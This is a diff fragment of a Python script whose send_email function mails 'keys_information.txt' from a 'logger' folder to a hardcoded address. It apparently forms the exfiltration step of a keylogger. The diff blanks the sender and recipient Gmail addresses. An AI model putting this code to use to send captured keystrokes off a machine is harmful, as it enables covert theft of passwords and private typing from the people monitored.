@@ -8,7 +8,7 @@ from email import encoders
 # Define the function to send an email with an attachment
 def send_email(filename, attachment_path, toaddr):
     # Your email address
-    fromaddr = "llaxmikantalakeri2404@gmail.com"  # Replace with your actual email address
+    fromaddr = ""  # Replace with your actual email address
 
     # Create the email message
     msg = MIMEMultipart()
@@ -45,4 +45,4 @@ def send_email(filename, attachment_path, toaddr):
     s.quit()
 
 # Call the function to send the email with the attachment
-send_email("keys_information.txt", r"C:\Users\Dell\OneDrive\Desktop\logger\keys_information.txt", toaddr="llaxmikant956@gmail.com")
+send_email("keys_information.txt", r"C:\Users\Dell\OneDrive\Desktop\logger\keys_information.txt", toaddr="")
